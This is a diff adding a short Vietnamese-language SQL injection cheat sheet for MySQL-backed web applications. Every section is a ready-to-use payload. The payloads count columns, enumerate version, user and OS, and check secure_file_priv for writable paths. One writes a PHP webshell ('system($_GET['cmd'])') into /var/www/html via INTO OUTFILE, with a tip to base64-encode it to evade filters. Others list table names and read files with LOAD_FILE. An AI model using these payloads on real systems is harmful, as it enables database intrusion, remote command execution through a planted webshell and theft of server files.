@@ -1,0 +1,27 @@
+-------tìm số cột -------
+99999 ORDER BY {số cột} -- 
+xong thì:
+99999 UNION SELECT 1,2,3... --
+
+-------kiểm tra quyền của user hiện tại -------
+99999 UNION SELECT 1,@@version,USER(),@@version_compile_os --
+
+-------Kiểm tra thư mục cho phép ghi -------
+99999 UNION SELECT 1,@@secure_file_priv,3,4 --
+Nếu trả về NULL → có thể ghi vào bất cứ đâu.
+Nếu trả về /var/lib/mysql-files/ → CHỈ được ghi vào đó.
+Nếu /var/www/html/ → bạn quá may mắn, cứ thế ghi luôn.
+
+-------Payload ghi file PHP webshell-------
+99999 UNION SELECT 1,"<?php system($_GET['cmd']); ?>",3,4 INTO OUTFILE '/var/www/html/shell.php' --
+(ví dụ nếu có 4 cột)
+(có thể thay <?php system('ls /'); ?>)
+có thể encode base64 tránh filter
+
+------- tên cột -------
+99999' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0,1 -- 
+(1 column)
+
+------- đọc file ------
+99999' UNION SELECT LOAD_FILE('/var/www/html/uploads/shell.php') --
+
